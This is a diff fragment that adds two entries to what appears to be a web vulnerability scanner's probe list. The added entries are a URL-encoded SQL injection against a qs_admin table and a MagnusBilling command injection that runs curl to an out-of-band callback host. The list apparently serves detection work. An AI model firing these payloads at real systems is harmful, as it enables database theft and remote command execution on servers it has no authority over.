@@ -541,3 +541,5 @@
 /wp-content/plugins/hippoo/readme.txt
 /?rest_route=/wc-hippoo/v1/ext/wp/v2/users/1
 /wp-json/wc-hippoo/v1/ext/wp/v2/users/1
+/plus/ajax_street.php?act=alphabet&x=11�%27%20union%20select%201,2,3,concat(0x3C2F613E20),5,6,7,md5({{num}}),9%20from%20qs_admin%23
+/mbilling/lib/icepay/icepay.php?democ={{randstr}};curl%20{{interactsh-url}};%23
